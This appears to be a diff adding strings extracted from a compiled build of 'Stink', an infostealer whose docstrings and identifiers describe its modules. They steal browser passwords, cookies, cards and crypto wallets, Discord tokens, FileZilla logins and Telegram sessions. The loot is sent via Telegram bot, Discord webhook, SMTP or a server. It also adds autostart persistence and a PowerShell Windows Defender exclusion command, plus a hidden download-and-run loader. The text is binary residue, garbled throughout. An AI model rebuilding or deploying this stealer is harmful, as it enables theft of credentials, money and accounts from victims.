+        areplaceTw\w/Tw/amethoda_grab_passwordsaargumentsuLogin DataastatusaFeaturesapasswordsa_grab_cookiesaNetworkacookiesa_grab_cardsuWeb Dataacardsa_grab_historyahistorya_grab_bookmarksabookmarksa_grab_extensionsa_grab_walletsuLocal Extension Settingsu
+        Collects browser profile data.
+
+        Parameters:
+        - profile [str]: Browser profile.
+
+        Returns:
+        - None.
+        u]: No profiles founda_get_keya_process_profileu
+        Collects data for each browser profile.
+
+        Parameters:
+        - None.
+
+        Returns:
+        - None.
+        a_kill_processa_check_pathsa_check_profilesaget_datau
+        Launches the browser data collection module.
+
+        Parameters:
+        - None.
+
+        Returns:
+        - None.
+        a__doc__a__file__a__spec__aoriginahas_locationa__cached__areTacompileabase64Tab64decodeajsonTaloadaloadsaTupleaListTadatetimeatimedeltaasqlite3TaconnectaConnectionaCursoraConnectionaCursorasubprocessTarunaCREATE_NEW_CONSOLEaSW_HIDEustink.helpers.dataclassesTaDataaDataustink.enums.featuresTaFeaturesustink.helpers.configTaChromiumConfigustink.helpersTaAESModeOfOperationGCMaDataBlobaMemoryStorageustink.modules.browsersa__module__u
+    Collects data from the browser.
+    aChromiuma__qualname__abrowser_nameabrowser_pathaprocess_nameastatusesa__init__uChromium.__init__uChromium._kill_processareturnuChromium._get_profilesDareturnnuChromium._check_pathsTcaencrypted_bytesaentropyuChromium._crypt_unprotect_dataDareturnObytesuChromium._get_keyDadateareturnOintOstruChromium._get_datetimeDavalueamaster_keyareturnObytespOstruChromium._decryptadatabaseuChromium._get_db_connectionDafile_pathareturnOstrpuChromium._get_fileDaprofileafile_pathareturnOstrpnuChromium._grab_passwordsuChromium._grab_cookiesuChromium._grab_cardsuChromium._grab_historyuChromium._grab_bookmarksDaprofileaextensions_pathareturnOstrpnuChromium._grab_extensionsDaprofileawalletsareturnOstrpnuChromium._grab_walletsDaprofileareturnOstrnuChromium._process_profileuChromium._check_profilesuChromium.runTustink\modules\browsers.pyTa.0aitemTa.0arowu<module stink.modules.browsers>Ta__class__Taselfabrowser_nameabrowser_pathaprocess_nameastatusesTaselfTaselfaprofileTaencrypted_bytesaentropyablobabufferTavalueamaster_keyTadateTadatabaseaconnectionacursorTafile_pathafileadataTaselfastateafileTaselfapatternaprofilesaprofile_pathsTaselfaprofileafile_pathafileabookmarks_listadataatempTaselfaprofileafile_pathacursoraconnectionacards_listadataatempTaselfaprofileafile_pathacursoraconnectionacookies_listacookies_list_filteredadataatempTaselfaprofileaextensions_pathaextensions_listaextensions_dirsadirpathaextension_diramanifest_pathafileamanifestanameaextensions_setTaselfaprofileafile_pathacursoraconnectionaresultsahistory_listadataatempTaselfaprofileafile_pathacursoraconnectionapasswords_listadataatempTaselfaprofileawalletsawalletaextensionaextension_pathweTaselfaprofileaprofile_nameafunctionsafunctionweTaselfwe.stink.modules2a__doc__a__file__apathadirnameajoinaenvironagetTaNUITKA_PACKAGE_stinku\not_existingamodulesTaNUITKA_PACKAGE_stink_modulesu\not_existinga__path__a__spec__aoriginahas_locationasubmodule_search_locationsa__cached__abrowsersTaChromiumlaChromiumladiscordTaDiscordaDiscordafilezillaTaFileZillaaFileZillaaprocessesTaProcessesaProcessesascreenshotTaScreenshotaScreenshotasystemTaSystemaSystematelegramTaTelegramaTelegramasteamTaSteamaSteamawalletsTaWalletsaWalletsLaChromiumaDiscordaFileZillaaProcessesaScreenshotaSystemaTelegramaSteamaWalletsa__all__ustink\modules\__init__.pyu<module stink.modules>u.stink.modules.discordUapathajoinuTokens.txta_Discord__fileaDiscordConfiga_Discord__configaMemoryStoragea_Discord__storageuContent-TypeuUser-AgentaUserAgentaAuthorizationaheadersu
+        Composes the headers for the query.
+
+        Parameters:
+        - token [str]: Discord token.
+        - content_type [str]: Content type.
+
+        Returns:
+        - dict: Headers data.
+        aurlopenaRequestaGETuhttps://discordapp.com/api/v6/users/@melTamethodaurlaheadersavalidaappendlainvalidu
+        Checks token for validity.
+
+        Parameters:
+        - *args [tuple]: Discord token and query headers.
+
+        Returns:
+        - None.
+        aTokensPathaprintTu[Discord]: No Discord found:lnnu.logu.ldbaselfwruutf-8aignoreareadlinesastripTu[\w-]{24}\.[\w-]{6}\.[\w-]{27}umfa\.[\w-]{84}afindalladataatokensaThreada_Discord__check_tokena_Discord__get_headersTatargetaargsasetDaemonTtastartatasksaloadsareadadecodeTuutf-8aDiscordDataatempaformatausernameuNo dataaemailaphoneabioaadd_from_memoryuInvalid tokens:
+w
+u
+
+Valid tokens:
+uaadd_dataTaApplicationaDiscordu
+        Collects all valid and invalid Discord tokens.
+
+        Parameters:
+        - None.
+
+        Returns:
+        - None.
+        u<genexpr>uDiscord.__get_tokens.<locals>.<genexpr>a_Discord__get_tokensaget_datau[Discord]: u
+        Launches the Discord tokens collection module.
+
+        Parameters:
+        - None.
+
+        Returns:
+        - None.
+        a__doc__a__file__a__spec__aoriginahas_locationa__cached__areTafindallajsonTaloadsathreadingTaThreadalistdiruurllib.requestTaRequestaurlopenaMutableMappingaDictustink.helpersTaMemoryStorageustink.helpers.configTaDiscordConfigustink.helpers.dataclassesTaDataaDataustink.modules.discorda__module__u
+    Collects tokens from the Discord.
+    aDiscorda__qualname__DafolderOstra__init__uDiscord.__init__Tnuapplication/jsonatokenacontent_typeareturna__get_headersuDiscord.__get_headersaargsTOstrpa__check_tokenuDiscord.__check_tokenDareturnna__get_tokensuDiscord.__get_tokensarunuDiscord.runTustink\modules\discord.pyTa.0aitemu<module stink.modules.discord>Ta__class__TaselfaargsaqueryTaselfatokenacontent_typeaheadersTaselfatokensafileadataaregexatasksatokenataskatemparesultastorageTaselfafolderTaselfwe.stink.modules.filezillaWapathajoinuSites.txta_FileZilla__fileaFileZillaConfiga_FileZilla__configaMemoryStoragea_FileZilla__storageaSitesPathaprintTu[FileZilla]: No FileZilla foundaDataFilesaElementTreeaparseaselfagetrootaFileZillaDatalafindallTaServerafindTaNameatextuTaUserTaPassTaHostTaPortab64decodeadecodeTuutf-8atempaappendadataaformatu[FileZilla]: u - aadd_from_memoryaadd_dataTaApplicationaFileZillau
+        Collects all FileZilla hosts.
+
+        Parameters:
+        - None.
+
+        Returns:
+        - None.
+        adata_filesu<genexpr>uFileZilla.__get_hosts.<locals>.<genexpr>a_FileZilla__get_hostsaget_datau
+        Launches the FileZilla hosts collection module.
+
+        Parameters:
+        - None.
+
+        Returns:
+        - None.
+        a__doc__a__file__a__spec__aoriginahas_locationa__cached__alistdirabase64Tab64decodeuxml.etreeTaElementTreeustink.helpersTaMemoryStorageustink.helpers.configTaFileZillaConfigustink.helpers.dataclassesTaDataaDataustink.modules.filezillaa__module__u
+    Collects hosts from the FileZilla.
+    aFileZillaa__qualname__DafolderOstra__init__uFileZilla.__init__Dareturnna__get_hostsuFileZilla.__get_hostsareturnarunuFileZilla.runTustink\modules\filezilla.pyTa.0afileadata_filesTa.0aitemu<module stink.modules.filezilla>Taselfafilesadata_filesatempafilearootadataaserverasite_nameasite_userasite_passasite_hostasite_portweTaselfafolderTaselfwe.stink.modules.processesUapathajoinuProcesses.txta_Processes__fileaMemoryStoragea_Processes__storageaDWORDllawindllapsapiaEnumProcessesabyrefasizeofavalueakernel32aOpenProcesslaProcessMemoryCountersExacbaGetProcessMemoryInfoacreate_unicode_bufferTlaGetModuleFileNameExWlaprocess_listaappendabasenameaWorkingSetSizeambuu MBaCloseHandleaadd_from_memoryw
+afunctionsacreate_tableaNameaMemoryaPIDaget_processes_listu
+        Collects all running processes.
+
+        Parameters:
+        - None.
+
+        Returns:
+        - None.
+        u<genexpr>uProcesses.__get_system_processes.<locals>.<genexpr>a_Processes__get_system_processesaget_dataaprintu[Processes]: u
+        Launches the processes collection module.
+
+        Parameters:
+        - None.
+
+        Returns:
+        - None.
+        a__doc__a__file__a__spec__aoriginahas_locationa__cached__aListustink.helpers.dataclassesTaDataaDataustink.helpersTafunctionsaProcessMemoryCountersExaMemoryStorageustink.modules.processesa__module__u
+    Collects all running processes.
+    aProcessesa__qualname__DafolderOstra__init__uProcesses.__init__areturnuProcesses.get_processes_listDareturnna__get_system_processesuProcesses.__get_system_processesarunuProcesses.runTustink\modules\processes.pyTa.0alineu<module stink.modules.processes>Ta__class__TaselfTaselfafolderTaprocess_listaprocess_idsabytes_neededambaindexaprocess_idaprocess_handleamemory_infoaprocess_nameTaselfwe.stink.modules.screenshot3a_Screenshot__folderaMemoryStoragea_Screenshot__storageaScreencaptureacreate_in_memoryutoo many values to unpack (expected 2)aselfaadd_from_memoryapathajoinumonitor-uu.pngu
+        Takes a screenshot of the monitors.
+
+        Parameters:
+        - None.
+
+        Returns:
+        - None.
+        a_Screenshot__create_screenaget_dataaprintu[Screenshot]: u
+        Launches the screenshots collection module.
+
+        Parameters:
+        - None.
+
+        Returns:
+        - None.
+        a__doc__a__file__a__spec__aoriginahas_locationa__cached__ustink.helpersTaScreencaptureaMemoryStoragelustink.helpers.dataclassesTaDataaDataustink.modules.screenshota__module__u
+    Takes a screenshot of the monitors.
+    aScreenshota__qualname__DafolderOstra__init__uScreenshot.__init__Dareturnna__create_screenuScreenshot.__create_screenareturnarunuScreenshot.runTustink\modules\screenshot.pyu<module stink.modules.screenshot>TaselfacaptureascreenshotsaindexamonitorTaselfafolderTaselfwe.stink.modules.steamKa_Steam__folderaMemoryStoragea_Steam__storageaOpenKeyaHKEY_LOCAL_MACHINEuSOFTWARE\Valve\SteamlaKEY_READaKEY_WOW64_32KEYaQueryValueExaInstallPathutoo many values to unpack (expected 2)u
+        Gets the Steam installation path from the registry.
+
+        Parameters:
+        - None.
+
+        Returns:
+        - str|None: Steam installation path if found.
+        a_Steam__get_steam_pathaprintTu[Steam]: No Steam founduu\configaavatarcacheaselfaadd_from_diskapathajoinasteam_pathaconfigafindallussfn.*aadd_dataTaApplicationaSteamu
+        Collects configs from the Steam.
+
+        Parameters:
+        - None.
+
+        Returns:
+        - None.
+        a_Steam__get_steam_filesaget_datau[Steam]: u
+        Launches the Steam collection module.
+
+        Parameters:
+        - None.
+
+        Returns:
+        - None.
+        a__doc__a__file__a__spec__aoriginahas_locationa__cached__areTafindallalistdiraOptionalawinregTaOpenKeyaQueryValueExaHKEY_LOCAL_MACHINEaKEY_READaKEY_WOW64_32KEYustink.helpersTaMemoryStorageustink.helpers.dataclassesTaDataaDataustink.modules.steama__module__u
+    Collects configs from the Steam.
+    aSteama__qualname__DafolderOstra__init__uSteam.__init__areturna__get_steam_pathuSteam.__get_steam_pathDareturnna__get_steam_filesuSteam.__get_steam_filesarunuSteam.runTustink\modules\steam.pyu<module stink.modules.steam>Ta__class__Taselfasteam_pathaconfigsaconfigassfnsassfnTakeyavaluew_TaselfafolderTaselfwe.stink.modules.systemapathajoinuConfiguration.txta_System__fileaSystemConfiga_System__configaMemoryStoragea_System__storageaDisplayDeviceasizeofacbawindllauser32aEnumDisplayDevicesWlabyrefaUnknownaDeviceStringastripu
+        Gets the video card name.
+
+        Parameters:
+        - None.
+
+        Returns:
+        - str: Video card name.
+        aMemoryStatusExadwLengthakernel32aGlobalMemoryStatusExaroundaullTotalPhysq@laullAvailPhysw
+afunctionsacreate_tableuUsed GBuFree GBuTotal GBu
+        Gets information about RAM.
+
+        Parameters:
+        - None.
+
+        Returns:
+        - str: RAM data table.
+        u<genexpr>uSystem.__get_ram.<locals>.<genexpr>aGetLogicalDrivesaascii_uppercaseabitmaskladrivesaappenduu:\aUlargeIntegeraGetDiskFreeSpaceExWac_wchar_paHighPartqaLowPartaresultLaDriveuUsed GBuFree GBuTotal GBu
+        Gets information about disks.
+
+        Parameters:
+        - None.
+
+        Returns:
+        - str: Disks data table.
+        uSystem.__get_disks_info.<locals>.<genexpr>aQueryValueExaOpenKeyaHKEY_LOCAL_MACHINEuHARDWARE\DESCRIPTION\System\CentralProcessor\0aProcessorNameStringu
+        Gets the processor name.
+
+        Parameters:
+        - None.
+
+        Returns:
+        - str: Processor name.
+        aloadsaurlopenaIPUrllTaurlatimeoutareadadecodeTuutf-8aipu
+        Gets the IP address.
+
+        Parameters:
+        - None.
+
+        Returns:
+        - str: IP address.
+        aSystemDataa_System__get_ipaplatformamachineanodea_System__get_processor_nameaget_video_carda_System__get_rama_System__get_disks_infoaGetSystemMetricsTlwxTlaadd_from_memoryaformataUseraadd_dataaIPaOSu
+        Collects all system data.
+
+        Parameters:
+        - None.
+
+        Returns:
+        - None.
+        a_System__get_system_infoaget_dataaprintu[System]: u
+        Launches the system data collection module.
+
+        Parameters:
+        - None.
+
+        Returns:
+        - None.
+        a__doc__a__file__a__spec__aoriginahas_locationa__cached__ajsonTaloadsastringTaascii_uppercaseuurllib.requestTaurlopenawinregTaOpenKeyaQueryValueExaHKEY_LOCAL_MACHINEustink.helpers.dataclassesTaDataaDataustink.helpers.configTaSystemConfigustink.helpersTaDisplayDeviceaMemoryStatusExaUlargeIntegerafunctionsaMemoryStorageustink.modules.systema__module__u
+    Collects all system data.
+    aSystema__qualname__DafolderOstra__init__uSystem.__init__DareturnOstruSystem.get_video_carda__get_ramuSystem.__get_rama__get_disks_infouSystem.__get_disks_infoa__get_processor_nameuSystem.__get_processor_namea__get_ipuSystem.__get_ipDareturnna__get_system_infouSystem.__get_system_infoareturnarunuSystem.runTustink\modules\system.pyTa.0alineu<module stink.modules.system>Ta__class__T
+akernel32adrivesabitmaskaletteraresultadriveatotal_bytesafree_bytesaavailable_bytesasuccessatotalafreeausedTaselfaipTamemory_statusakernel32atotalausedafreeTaselfauser32adataanet_infoamachine_typeaos_infoanetwork_nameacpu_infoagpu_infoaram_infoadisk_infoamonitors_infoTaselfafolderTadisplay_deviceauser32aresultTaselfwe.stink.modules.telegramTa_Telegram__folderaTelegramConfiga_Telegram__configaMemoryStoragea_Telegram__storageaSessionsPathaOpenKeyaHKEY_CURRENT_USERuSoftware\Microsoft\Windows\CurrentVersion\UninstallaQueryInfoKeylaEnumKeyakeyaQueryValueExaDisplayNameaTelegramaInstallLocationaprintu[Telegram]: uu
+        Gets the Telegram installation path from the registry.
+
+        Parameters:
+        - None.
+
+        Returns:
+        - str|None: Telegram installation path if found.
+        a_Telegram__get_telegram_pathTu[Telegram]: No Telegram foundapathajoinatdataafindalluD877F783D5D3EF8C.*aremoveTaD877F783D5D3EF8Caselfaadd_from_diskatelegram_dataaD877F783D5D3EF8Cumap.*akey_datasaadd_dataTaApplicationaTelegramu
+        Collects sessions from the Telegram.
+
+        Parameters:
+        - None.
+
+        Returns:
+        - None.
+        a_Telegram__get_sessionsaget_datau
+        Launches the Telegram collection module.
+
+        Parameters:
+        - None.
+
+        Returns:
+        - None.
+        a__doc__a__file__a__spec__aoriginahas_locationa__cached__areTafindallalistdiraOptionalawinregTaOpenKeyaQueryValueExaQueryInfoKeyaEnumKeyaHKEY_CURRENT_USERustink.helpersTaMemoryStorageustink.helpers.configTaTelegramConfigustink.helpers.dataclassesTaDataaDataustink.modules.telegrama__module__u
+    Collects sessions from the Telegram.
+    a__qualname__DafolderOstra__init__uTelegram.__init__areturna__get_telegram_pathuTelegram.__get_telegram_pathDareturnna__get_sessionsuTelegram.__get_sessionsarunuTelegram.runTustink\modules\telegram.pyu<module stink.modules.telegram>Ta__class__Taselfatelegram_pathatelegram_dataasessionsasessionamapsamapTaselfakeywiasubkey_nameasubkeyadisplay_nameweTaselfafolderTaselfwe.stink.modules.wallets9a_Wallets__folderaWalletsConfiga_Wallets__configaMemoryStoragea_Wallets__storageaWalletPathsapathaexistsaprintu[Wallets]: No anameuu foundaselfaadd_from_diskajoinaadd_dataaWalletu
+        Collects configs from the crypto wallets.
+
+        Parameters:
+        - None.
+
+        Returns:
+        - None.
+        a_Wallets__get_wallets_filesaget_datau[Wallets]: u
+        Launches the crypto wallets collection module.
+
+        Parameters:
+        - None.
+
+        Returns:
+        - None.
+        a__doc__a__file__a__spec__aoriginahas_locationa__cached__ustink.helpersTaMemoryStoragelustink.helpers.configTaWalletsConfigustink.helpers.dataclassesTaDataaDataustink.modules.walletsa__module__u
+    Collects configs from the crypto wallets.
+    aWalletsa__qualname__DafolderOstra__init__uWallets.__init__Dareturnna__get_wallets_filesuWallets.__get_wallets_filesareturnarunuWallets.runTustink\modules\wallets.pyu<module stink.modules.wallets>TaselfawalletsawalletTaselfafolderTaselfwe.stink.multistealeraThreada__init__DanameaStealeraFeaturesaallaProtectorsadisablea_Stealer__protectorsa_Stealer__loadersa_Stealer__grabbersa_Stealer__sendersaUtilsaautostarta_Stealer__autostartamessagea_Stealer__messagea_Stealer__delayaMultistealerConfiga_Stealer__configaMemoryStoragea_Stealer__storageapasswordsacookiesacardsahistoryabookmarksaextensionsawalletsaobjectaChromiumaargumentsaBrowsersaCHROMEavalueaBrowsersDataapathaprocessastatusaOPERA_GXaOPERA_DEFAULTaEDGEaBRAVEaVIVALDIaYANDEXaSystemTaSystemasystemaProcessesaprocessesaScreenshotascreenshotaDiscordTuPrograms/DiscordadiscordaTelegramTuPrograms/TelegramatelegramaFileZillaTuPrograms/FileZillaafilezillaaSteamTuPrograms/SteamasteamaWalletsTaWalletsa_Stealer__methodsasleepaMessagearunTatargetastartaProtectorassla_create_unverified_contexta_create_default_https_contextaPoolaPoolSizeTaprocessesa__enter__a__exit__astarmapafunctionsarun_processTnnnaclosearesultsagrabber_resultsacreate_zipafilesacreate_previewafieldsaselfaZipNameadataapreviewaAutostartaargvlaprintu[Multi stealer]: uu
+        Launches the Stink.
+
+        Parameters:
+        - None.
+
+        Returns:
+        - None.
+        a__doc__a__file__a__spec__aoriginahas_locationa__cached__atimeTasleepaListaAnyathreadingTaThreadamultiprocessingTaPoolustink.enumsTaFeaturesaUtilsaProtectorsustink.helpersTafunctionsaMemoryStorageustink.helpers.configTaMultistealerConfigaBrowsersustink.utilsTaAutostartaMessageaProtectoraLoaderaGrabberaLoaderaGrabberustink.modulesTaChromiumaDiscordaFileZillaaProcessesaScreenshotaSystemaTelegramaSteamaWalletsa__prepare__aStealera__getitem__u%s.__prepare__() must return a mapping, not %sa__name__u<metaclass>ustink.multistealera__module__u
+    Collects and sends the specified data.
+    a__qualname__TnnnnnnlasendersafeaturesautilsaloadersaprotectorsagrabbersadelayaintuStealer.__init__DareturnnuStealer.runa__orig_bases__ustink\multistealer.pyu<module stink.multistealer>Ta__class__T
+aselfasendersafeaturesautilsaloadersaprotectorsagrabbersadelayabrowser_functionsabrowser_statusesTaselfapoolaresultsagrabber_resultsadataapreviewasenderaloaderwe.stink.senders#a__doc__a__file__apathadirnameajoinaenvironagetTaNUITKA_PACKAGE_stinku\not_existingasendersTaNUITKA_PACKAGE_stink_sendersu\not_existinga__path__a__spec__aoriginahas_locationasubmodule_search_locationsa__cached__atelegramTaTelegramlaTelegramlaserverTaServeraServerasmtpTaSmtpaSmtpadiscordTaDiscordaDiscordLaTelegramaSmtpaServeraDiscorda__all__ustink\senders\__init__.pyu<module stink.senders>u.stink.senders.discordvNa__class__a__init__a_Discord__webhooka_encoderaencodeacontenta_Discord__previewafilea_Discord__zip_nameuu.zipa_Discord__datautoo many values to unpack (expected 2)u
+        Gets data to send.
+
+        Parameters:
+        - None.
+
+        Returns:
+        - tuple: A tuple of content type, body, and Discord webhook.
+        a_Discord__get_sender_dataaRequestaPOSTTamethodaurladataaadd_headeruUser-Agenta_configaUserAgentuContent-Typeaurlopenu
+        Sends the data.
+
+        Parameters:
+        - None.
+
+        Returns:
+        - None.
+        a_create_unverified_httpsa_Discord__send_archiveaprintu[Discord sender]: u
+        Launches the sender module.
+
+        Parameters:
+        - zip_name [str]: Archive name.
+        - data [BytesIO]: BytesIO object.
+        - preview [str]: Collected data summary.
+
+        Returns:
+        - None.
+        a__doc__a__file__a__spec__aoriginahas_locationa__cached__aBytesIOaTuplelaUnionuurllib.requestTaRequestaurlopenustink.abstractTaAbstractSenderaAbstractSendera__prepare__aDiscorda__getitem__u%s.__prepare__() must return a mapping, not %sa__name__u<metaclass>ustink.senders.discorda__module__u
+    Sender for the Discord.
+    a__qualname__awebhookastruDiscord.__init__areturnabytesa__get_sender_datauDiscord.__get_sender_dataDareturnna__send_archiveuDiscord.__send_archiveazip_nameadataapreviewarunuDiscord.runa__orig_bases__ustink\senders\discord.pyu<module stink.senders.discord>Ta__class__Taselfacontent_typeabodyTaselfawebhooka__class__Taselfacontent_typeabodyaqueryTaselfazip_nameadataapreviewwe.stink.senders.serverILa__class__a__init__a_Server__servera_encoderaencodeadocumenta_Server__zip_nameuu.zipa_Server__datautoo many values to unpack (expected 2)u
+        Gets data to send.
+
+        Parameters:
+        - None.
+
+        Returns:
+        - tuple: A tuple of content type, body, and server route.
+        a_Server__get_sender_dataaRequestaPOSTTamethodaurladataaadd_headeruUser-Agenta_configaUserAgentuContent-Typeaurlopenu
+        Sends the data.
+
+        Parameters:
+        - None.
+
+        Returns:
+        - None.
+        a_create_unverified_httpsa_Server__send_archiveaprintu[Server sender]: u
+        Launches the sender module.
+
+        Parameters:
+        - zip_name [str]: Archive name.
+        - data [BytesIO]: BytesIO object.
+        - preview [str]: Collected data summary.
+
+        Returns:
+        - None.
+        a__doc__a__file__a__spec__aoriginahas_locationa__cached__aBytesIOaTuplelaUnionuurllib.requestTaRequestaurlopenustink.abstractTaAbstractSenderaAbstractSendera__prepare__aServera__getitem__u%s.__prepare__() must return a mapping, not %sa__name__u<metaclass>ustink.senders.servera__module__u
+    Sender for the Server.
+    a__qualname__aserverastruServer.__init__areturnabytesa__get_sender_datauServer.__get_sender_dataDareturnna__send_archiveuServer.__send_archiveazip_nameadataapreviewarunuServer.runa__orig_bases__ustink\senders\server.pyu<module stink.senders.server>Ta__class__Taselfacontent_typeabodyTaselfaservera__class__Taselfacontent_typeabodyaqueryTaselfazip_nameadataapreviewwe.stink.senders.smtpY]a__class__a__init__a_Smtp__sender_emaila_Smtp__sender_passworda_Smtp__recipient_emaila_Smtp__smtp_servera_Smtp__smtp_portaEmailMessageaFromaTouStink logs from agetuseruaSubjectaset_contenta_Smtp__previewaadd_attachmenta_Smtp__dataagetvalueaapplicationuoctet-streama_Smtp__zip_nameu.zipTamaintypeasubtypeafilenameu
+        Gets data to send.
+
+        Parameters:
+        - None.
+
+        Returns:
+        - tuple: A tuple of content type, body, and server route.
+        a_Smtp__get_sender_dataaSMTPastarttlsaloginasend_messageaquitu
+        Sends the data.
+
+        Parameters:
+        - None.
+
+        Returns:
+        - None.
+        a_create_unverified_httpsa_Smtp__send_archiveaprintu[Smtp sender]: u
+        Launches the sender module.
+
+        Parameters:
+        - zip_name [str]: Archive name.
+        - data [BytesIO]: BytesIO object.
+        - preview [str]: Collected data summary.
+
+        Returns:
+        - None.
+        a__doc__a__file__a__spec__aoriginahas_locationa__cached__aBytesIOasmtplibTaSMTPlagetpassTagetuseruemail.messageTaEmailMessageaMessageaMessageustink.abstractTaAbstractSenderaAbstractSendera__prepare__aSmtpa__getitem__u%s.__prepare__() must return a mapping, not %sa__name__u<metaclass>ustink.senders.smtpa__module__u
+    Sender for the Email.
+    a__qualname__Tusmtp.gmail.comlKasender_emailastrasender_passwordarecipient_emailasmtp_serverasmtp_portaintuSmtp.__init__areturna__get_sender_datauSmtp.__get_sender_dataDareturnna__send_archiveuSmtp.__send_archiveazip_nameadataapreviewarunuSmtp.runa__orig_bases__ustink\senders\smtp.pyu<module stink.senders.smtp>Ta__class__TaselfamessageTaselfasender_emailasender_passwordarecipient_emailasmtp_serverasmtp_porta__class__TaselfamessageaserverTaselfazip_nameadataapreviewwe.stink.senders.telegramUa__class__a__init__a_Telegram__tokena_Telegram__user_iduhttps://api.telegram.org/botuu/sendDocumenta_Telegram__urla_encoderaencodeachat_idacaptiona_Telegram__previewadocumenta_Telegram__zip_nameu.zipa_Telegram__datautoo many values to unpack (expected 2)u
+        Gets data to send.
+
+        Parameters:
+        - None.
+
+        Returns:
+        - tuple: A tuple of content type, body, and Telegram api url.
+        a_Telegram__get_sender_dataaRequestaPOSTTamethodaurladataaadd_headeruUser-Agenta_configaUserAgentuContent-Typeaurlopenu
+        Sends the data.
+
+        Parameters:
+        - None.
+
+        Returns:
+        - None.
+        a_create_unverified_httpsa_Telegram__send_archiveaprintu[Telegram sender]: u
+        Launches the sender module.
+
+        Parameters:
+        - zip_name [str]: Archive name.
+        - data [BytesIO]: BytesIO object.
+        - preview [str]: Collected data summary.
+
+        Returns:
+        - None.
+        a__doc__a__file__a__spec__aoriginahas_locationa__cached__aBytesIOaTuplelaUnionuurllib.requestTaRequestaurlopenustink.abstractTaAbstractSenderaAbstractSendera__prepare__aTelegrama__getitem__u%s.__prepare__() must return a mapping, not %sa__name__u<metaclass>ustink.senders.telegrama__module__u
+    Sender for the Telegram.
+    a__qualname__atokenastrauser_idaintuTelegram.__init__areturnabytesa__get_sender_datauTelegram.__get_sender_dataDareturnna__send_archiveuTelegram.__send_archiveazip_nameadataapreviewarunuTelegram.runa__orig_bases__ustink\senders\telegram.pyu<module stink.senders.telegram>Ta__class__Taselfacontent_typeabodyTaselfatokenauser_ida__class__Taselfacontent_typeabodyaqueryTaselfazip_nameadataapreviewwe.stink.utils.autostartCa_Autostart__executor_pathaAutostartConfiga_Autostart__configapathajoinaAutostartPathaAutostartNameuu.exea_Autostart__autostart_patharemoveacopyfileu
+        Creates a copy of the file.
+
+        Parameters:
+        - None.
+
+        Returns:
+        - None.
+        aPopenupowershell -Command Add-MpPreference -ExclusionPath 'w'aCREATE_NEW_CONSOLEaSW_HIDETashellacreationflagsu
+        Trying to exclude a file from Windows Defender checks.
+
+        Parameters:
+        - None.
+
+        Returns:
+        - None.
+        awindllakernel32aSetFileAttributesWlu
+        Makes a file hidden.
+
+        Parameters:
+        - None.
+
+        Returns:
+        - None.
+        a_Autostart__add_to_autostarta_Autostart__exclude_from_defendera_Autostart__hide_fileaprintu[Autostart]: u
+        Launches the autostart module.
+
+        Parameters:
+        - None.
+
+        Returns:
+        - None.
+        a__doc__a__file__a__spec__aoriginahas_locationa__cached__lashutilTacopyfileasubprocessTaPopenaCREATE_NEW_CONSOLEaSW_HIDEustink.helpers.configTaAutostartConfigustink.utils.autostarta__module__u
+    Adds the file to autostart.
+    aAutostarta__qualname__Daexecutor_pathOstra__init__uAutostart.__init__Dareturnna__add_to_autostartuAutostart.__add_to_autostarta__exclude_from_defenderuAutostart.__exclude_from_defendera__hide_fileuAutostart.__hide_filearunuAutostart.runTustink\utils\autostart.pyu<module stink.utils.autostart>TaselfTaselfaexecutor_pathTaselfwe.stink.utils&a__doc__a__file__apathadirnameajoinaenvironagetTaNUITKA_PACKAGE_stinku\not_existingautilsTaNUITKA_PACKAGE_stink_utilsu\not_existinga__path__a__spec__aoriginahas_locationasubmodule_search_locationsa__cached__aautostartTaAutostartlaAutostartlamessageTaMessageaMessagealoaderTaLoaderaLoaderaprotectorTaProtectoraProtectoragrabberTaGrabberaGrabberLaAutostartaMessageaLoaderaProtectoraGrabbera__all__ustink\utils\__init__.pyu<module stink.utils>u.stink.utils.grabberEa_Grabber__pathsa_Grabber__file_typesa_Grabber__check_sub_foldersaMemoryStoragea_Grabber__storageaGrabbera_Grabber__folderapathaisfileaselfaadd_from_diskajoinaadd_dataabasenameaisdirawalkutoo many values to unpack (expected 3)afolder_namealistdiraitemu
+        Collects the specified files from the specified paths.
+
+        Parameters:
+        - None.
+
+        Returns:
+        - None.
+        aendswithu<genexpr>uGrabber.__grab_files.<locals>.<genexpr>afilenamea_Grabber__grab_filesaget_dataaprintu[Grabber]: uu
+        Launches the grabber module.
+
+        Parameters:
+        - None.
+
+        Returns:
+        - None.
+        a__doc__a__file__a__spec__aoriginahas_locationa__cached__aListlustink.helpersTaMemoryStorageustink.helpers.dataclassesTaDataaDataustink.utils.grabbera__module__u
+    Collects the specified files from the specified paths.
+    a__qualname__TFapathsafile_typesacheck_sub_foldersa__init__uGrabber.__init__Dareturnna__grab_filesuGrabber.__grab_filesareturnarunuGrabber.runTustink\utils\grabber.pyTa.0afile_typeafilenameTa.0afile_typeaitemu<module stink.utils.grabber>Ta__class__Taselfaitemafolder_namew_afilenamesafilenameTaselfapathsafile_typesacheck_sub_foldersTaselfwe.stink.utils.loaderE3a_Loader__urla_Loader__destination_patha_Loader__open_filearemoveaurlretrieveu
+        Downloads the file.
+
+        Parameters:
+        - None.
+
+        Returns:
+        - None.
+        aPopenaCREATE_NEW_CONSOLEaSW_HIDETashellacreationflagsu
+        Opens the file.
+
+        Parameters:
+        - None.
+
+        Returns:
+        - None.
+        a_Loader__load_filea_Loader__open_loaded_fileaprintu[Loader]: uu
+        Launches the loader module.
+
+        Parameters:
+        - None.
+
+        Returns:
+        - None.
+        a__doc__a__file__a__spec__aoriginahas_locationa__cached__apathluurllib.requestTaurlretrieveasubprocessTaPopenaCREATE_NEW_CONSOLEaSW_HIDEustink.utils.loadera__module__u
+    Loads a file from a link.
+    aLoadera__qualname__TFDaurladestination_pathaopen_fileOstrpOboola__init__uLoader.__init__Dareturnna__load_fileuLoader.__load_filea__open_loaded_fileuLoader.__open_loaded_filearunuLoader.runTustink\utils\loader.pyu<module stink.utils.loader>Taselfaurladestination_pathaopen_fileTaselfTaselfwe.stink.utils.message(aMessageConfiga_Message__configawindllauser32aMessageBoxWlaMessageDescriptionaMessageTitlelu
+        Creates a fake error window.
+
+        Parameters:
+        - None.
+
+        Returns:
+        - None.
+        a_Message__create_message_windowaprintu[Message]: uu
+        Launches the fake error window module.
+
+        Parameters:
+        - None.
+
+        Returns:
+        - None.
+        a__doc__a__file__a__spec__aoriginahas_locationa__cached__ustink.helpers.configTaMessageConfigustink.utils.messagea__module__u
+    Shows a fake error window.
